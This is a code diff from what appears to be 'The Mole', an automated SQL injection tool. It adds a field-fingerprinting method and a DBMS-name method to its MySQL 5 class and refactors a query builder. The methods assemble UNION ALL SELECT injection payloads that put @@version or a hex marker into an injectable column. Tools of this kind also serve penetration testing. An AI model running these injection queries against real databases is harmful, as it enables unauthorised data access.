@@ -45,6 +45,14 @@ class DbmsMole():
             hashes.append(DbmsMole.to_hex(str(base + i)))
             to_search.append(str(base + i))
         return (hashes, to_search)
+    
+    @classmethod
+    def field_finger(cls):
+        pass
+        
+    @classmethod
+    def dbms_name(cls):
+        return ''
 
 class Mysql5Mole(DbmsMole):
 
@@ -52,6 +60,7 @@ class Mysql5Mole(DbmsMole):
     out_delimiter_result = "::-::"
     inner_delimiter = "0x3a3a"
     inner_delimiter_result = "::"
+    field_finger_str = 'The Mole!'
 
     @classmethod
     def parse_condition(self, condition):
@@ -62,14 +71,27 @@ class Mysql5Mole(DbmsMole):
         return ''.join(cond)
     
     @classmethod
+    def dbms_name(cls):
+        return 'Mysql 5'
+    
+    @classmethod
+    def field_finger(cls):
+        return Mysql5Mole.field_finger_str
+    
+    @classmethod
+    def field_finger_query(cls, columns, injectable_field):
+        query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
+        query_list = list(map(str, range(columns)))
+        query_list[injectable_field] = DbmsMole.to_hex(Mysql5Mole.field_finger_str)
+        query += ",".join(query_list) + " {com}"
+        return query
+    
+    @classmethod
     def dbms_check_query(cls, columns, injectable_field):
         query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
-        query += ','.join(map(str, range(columns))).replace(
-            str(injectable_field),
-            "@@version",
-            1
-        )
-        query += " {com}"
+        query_list = list(map(str, range(columns)))
+        query_list[injectable_field] = "@@version"
+        query += ",".join(query_list) + " {com}"
         return query
     
     
